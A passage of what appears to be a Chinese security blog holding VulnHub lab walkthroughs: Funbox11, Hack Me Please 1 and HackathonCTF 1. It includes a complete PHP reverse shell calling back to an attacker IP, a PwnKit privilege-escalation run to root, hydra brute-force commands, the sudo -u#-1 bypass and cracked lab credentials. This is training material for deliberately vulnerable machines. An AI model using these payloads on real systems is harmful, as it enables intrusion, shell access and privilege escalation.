<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241812016.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241813946.png" /></p>
<p> 123456 <span class="math inline">\(\Rightarrow\)</span>
<code>$P$E0LB.ps5CD9nBJkGz2k0k6ER9NjbE90</code></p>
<h3 id="反弹-shell">3.2. 反弹 shell</h3>
<p>admin/123456 登录 WordPress，反弹个 www-data 的 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241841916.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404241841917.png" /></p>
<h3 id="提权">3.3. 提权</h3>
<p>上传 linpeas.sh 找到个 CVE-2021-4034 ，经测可成功提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@funbox11:/tmp/CVE-2021-4034-main$ make</span><br><span class="line">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class="line">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules</span><br><span class="line"><span class="built_in">mkdir</span> -p GCONV_PATH=.</span><br><span class="line"><span class="built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.</span><br><span class="line">www-data@funbox11:/tmp/CVE-2021-4034-main$ <span class="built_in">ls</span> -al</span><br><span class="line">total 72</span><br><span class="line">drwxr-xr-x  4 www-data www-data 4096 Apr 24 12:37 .</span><br><span class="line">drwxrwxrwt 12 root     root     4096 Apr 24 12:37 ..</span><br><span class="line">-rwxr--r--  1 www-data www-data  114 Jan 30  2022 .gitignore</span><br><span class="line">drwxr-xr-x  2 www-data www-data 4096 Apr 24 12:37 GCONV_PATH=.</span><br><span class="line">-rwxr--r--  1 www-data www-data 1071 Jan 30  2022 LICENSE</span><br><span class="line">-rwxr--r--  1 www-data www-data  469 Jan 30  2022 Makefile</span><br><span class="line">-rwxr--r--  1 www-data www-data 3419 Jan 30  2022 README.md</span><br><span class="line">-rwxr-xr-x  1 www-data www-data 8672 Apr 24 12:37 cve-2021-4034</span><br><span class="line">-rwxr--r--  1 www-data www-data  292 Jan 30  2022 cve-2021-4034.c</span><br><span class="line">-rwxr--r--  1 www-data www-data  305 Jan 30  2022 cve-2021-4034.sh</span><br><span class="line">drwxr-xr-x  2 www-data www-data 4096 Jan 30  2022 dry-run</span><br><span class="line">-rw-r--r--  1 www-data www-data   33 Apr 24 12:37 gconv-modules</span><br><span class="line">-rwxr--r--  1 www-data www-data  339 Jan 30  2022 pwnkit.c</span><br><span class="line">-rwxr-xr-x  1 www-data www-data 8304 Apr 24 12:37 pwnkit.so</span><br><span class="line">www-data@funbox11:/tmp/CVE-2021-4034-main$ ./cve-2021-4034</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),33(www-data)</span><br><span class="line"><span class="comment"># p^H^H^His</span></span><br><span class="line">/bin/sh: 2is: not found</span><br><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line">root@funbox11:/tmp/CVE-2021-4034-main<span class="comment"># cd /root/</span></span><br><span class="line">root@funbox11:/root<span class="comment"># ls -al</span></span><br><span class="line">total 48</span><br><span class="line">drwx------  4 root root 4096 Jul 20  2021 .</span><br><span class="line">drwxr-xr-x 23 root root 4096 Apr 23 17:33 ..</span><br><span class="line">-rw-------  1 root root    5 Jul 20  2021 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Jul 19  2021 .cache</span><br><span class="line">-rw-------  1 root root  149 Jul 20  2021 .mysql_history</span><br><span class="line">drwxr-xr-x  2 root root 4096 Jul 19  2021 .nano</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-------  1 root root 4669 Jul 20  2021 .viminfo</span><br><span class="line">-rw-r--r--  1 root root  167 Apr 24 09:20 .wget-hsts</span><br><span class="line">-rw-r--r--  1 root root 2291 Jul 20  2021 root.txt</span><br><span class="line">root@funbox11:/root<span class="comment"># cat root.txt </span></span><br><span class="line">$$$$$$$$\                  $$\                                                                       </span><br><span class="line">$$  _____|                 $$ |                                                                      </span><br><span class="line">$$ |   $$\   $$\ $$$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$\                                         </span><br><span class="line">$$$$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ \$$\ $$  |\__|                                        </span><br><span class="line">$$  __|$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ /  $$ | \$$$$  /                                             </span><br><span class="line">$$ |   $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ | $$  $$&lt;  $$\                                         </span><br><span class="line">$$ |   \$$$$$$  |$$ |  $$ |$$$$$$$  |\$$$$$$  |$$  /\$$\ \__|                                        </span><br><span class="line">\__|    \______/ \__|  \__|\_______/  \______/ \__/  \__|                                            </span><br><span class="line">                                                                                                     </span><br><span class="line">                                                                                                     </span><br><span class="line">                                                                                                     </span><br><span class="line"> $$$$$$\                      $$\            $$\     $$\       $$\       $$\       $$\ $$\           </span><br><span class="line">$$  __$$\                     \__|           $$ |    $$ |      \__|      $$ |      $$ |\__|          </span><br><span class="line">$$ /  \__| $$$$$$$\  $$$$$$\  $$\  $$$$$$\ $$$$$$\   $$ |  $$\ $$\  $$$$$$$ | $$$$$$$ |$$\  $$$$$$\  </span><br><span class="line">\$$$$$$\  $$  _____|$$  __$$\ $$ |$$  __$$\\_$$  _|  $$ | $$  |$$ |$$  __$$ |$$  __$$ |$$ |$$  __$$\ </span><br><span class="line"> \____$$\ $$ /      $$ |  \__|$$ |$$ /  $$ | $$ |    $$$$$$  / $$ |$$ /  $$ |$$ /  $$ |$$ |$$$$$$$$ |</span><br><span class="line">$$\   $$ |$$ |      $$ |      $$ |$$ |  $$ | $$ |$$\ $$  _$$&lt;  $$ |$$ |  $$ |$$ |  $$ |$$ |$$   ____|</span><br><span class="line">\$$$$$$  |\$$$$$$$\ $$ |      $$ |$$$$$$$  | \$$$$  |$$ | \$$\ $$ |\$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\ </span><br><span class="line"> \______/  \_______|\__|      \__|$$  ____/   \____/ \__|  \__|\__| \_______| \_______|\__| \_______|</span><br><span class="line">                                  $$ |                                                               </span><br><span class="line">                                  $$ |                                                               </span><br><span class="line">                                  \__|                                                               </span><br><span class="line"></span><br><span class="line">Please, tweet this to: @0815R2d2</span><br><span class="line">Thank you...</span><br><span class="line">root@funbox11:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>Vulnhub</tag>
        <tag>靶场</tag>
        <tag>ProFTPD 1.3.3c</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack Me Please: 1 </title>
    <url>/2024/03/09/Hack%20Me%20Please%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/hack-me-please-1,731/">Hack Me
Please: 1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102045700.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102046788.png" /></p>
<p>所开端口：80【进一步 web 信息收集】,3306【弱口令】,33060</p>
<p>尝试爆破 3306 端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -t 4 -e n -f -v 192.168.159.136 mysql</span><br></pre></td></tr></table></figure>
<p>无果……</p>
<h3 id="web-信息收集">1.3. web 信息收集</h3>
<p>尝试注入</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102112513.png" /></p>
<p>无果……目录遍历</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102103510.png" /></p>
<p>没直接扫到什么有价值的信息，对 js 和 img 目录继续深入扫描</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102106258.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102117194.png" /></p>
<p>img 目录下，aa 是个图片，下载后分析也没找到隐藏信息……</p>
<p>js 目录下有个 main.js，翻主页源码也可以看到几个 js
脚本，访问看看……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102106645.png" /></p>
<p>在 <code>main.js</code> 看到个可疑目录
<code>/seeddms51x/seeddms-5.1.22/</code> ,猜测服务器有部署 seeddms
文档管理系统，进一步测试</p>
<p>直接访问
<code>http://192.168.159.136/seeddms51x/seeddms-5.1.22/</code>
，需要登录，尝试注入和弱口令</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102115269.png" /></p>
<p>无果……</p>
<p>继续扫目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.136/seeddms51x/seeddms-5.1.22/&quot;</span></span><br><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.136/seeddms51x/&quot;</span></span><br><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.136/seeddms51x/conf/&quot;</span></span><br><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.136/seeddms51x/data/&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102316823.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102316824.png" /></p>
<p>扫到个配置文件 <code>/seeddms51x/conf/settings.xml</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102131249.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>利用数据库信息成功登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102134058.png" /></p>
<p>数据库中找到两个用户信息表</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102136222.png" /></p>
<p><code>saket/Saket@#$1337</code> 应该是服务器的一个普通用户，tblUsers
可能是 seeddms 系统的用户信息</p>
<p>尝试用 MDUT 提权，但失败了……</p>
<p>查找 seeddms 历史漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102238246.png" /></p>
<p>可能有 RCE 漏洞，测试需要用户信息，前面数据库可查得 admin
用户，密码尝试在线破解失败，直接修改 admin 的密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102236840.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102236939.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102238242.png" /></p>
<p>漏洞利用信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102248882.png" /></p>
<p>尝试反弹个 shell</p>
<p>shell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.159.152&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">4444</span>;</span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">	<span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">	<span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>按照漏洞利用信息，上传 shell.php</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102253099.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102253100.png" /></p>
<p>nc 开启监听后访问
<code>http://192.168.159.136/seeddms51x/data/1048576/4/1.php</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102304181.png" /></p>
<p>获取更便捷的交互式 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102304131.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>存在 saket 用户，尝试用前面得到的 <code>saket/Saket@#$1337</code>
切换用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403102309805.png" /></p>
<p>拿到 root 权限……</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>HackathonCTF: 1</title>
    <url>/2024/03/27/HackathonCTF%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/hackathonctf-1,591/">HackathonCTF: 1
~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403262212607.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403262212681.png" /></p>
<p>所开端口：21【ftp】,23【Telnet】,80【web】,7223【ssh】</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p><code>http://192.168.159.129</code> 响应 404，遍历目录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403262220135.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403262220136.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403262220137.png" /></p>
<p>要暴力破解 ssh ?……待定</p>
<p>其他三个页面也是 404，继续目录遍历，/ctf/,/sudo/,/ftc/
下没扫到，换了个字典在根目录扫到了几个页面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.129/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt -f</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271036610.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271036611.png" /></p>
<p>应该是ASCII码，转换下</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271036612.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271036613.png" /></p>
<p>根据爆破提示，用 rockyou.txt 跑下 test 用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l <span class="built_in">test</span> -P rockyou.txt  ssh://192.168.159.129 -e nsr -v -s 7223 -t 10</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271057285.png" /></p>
<p>得 test/jordan23</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 登录 test</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271058860.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p><code>cat .bash_history</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271100756.png" /></p>
<p>看下 pass.txt</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271101627.png" /></p>
<p>解码得 <code>CTFdfrGHYjUsSsKK@12345</code> ,不知道有啥用，暂存</p>
<p>有个 ctf.zip 没找到，不过 /var/ 下找到个 zip.rar，利用 scp
传出来尝试解压</p>
<p>解压需要密码，经测正是 <code>CTFdfrGHYjUsSsKK@12345</code>
,解压后找到个hint.txt，不过里面啥也没有……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271125666.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -writable 2&gt;/dev/null  <span class="comment"># 查找具有写入权限的文件</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab /etc/cron.d/* <span class="comment"># 定时任务</span></span><br></pre></td></tr></table></figure>
<p>没找到有价值的信息，没思路了……谷歌……sudo 存在提权漏洞【<a
href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security
Bypass - Linux local Exploit</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271214348.png" /></p>
<p>成功！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HackathonCTF: 2</title>
    <url>/2024/03/27/HackathonCTF%202/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/hackathonctf-2,714/">HackathonCTF: 2
~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271300363.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271300631.png" /></p>
<p>21 允许匿名登录，且有 flag1.txt 和 word.dir
两个文件，80【web】，7223【ssh】</p>
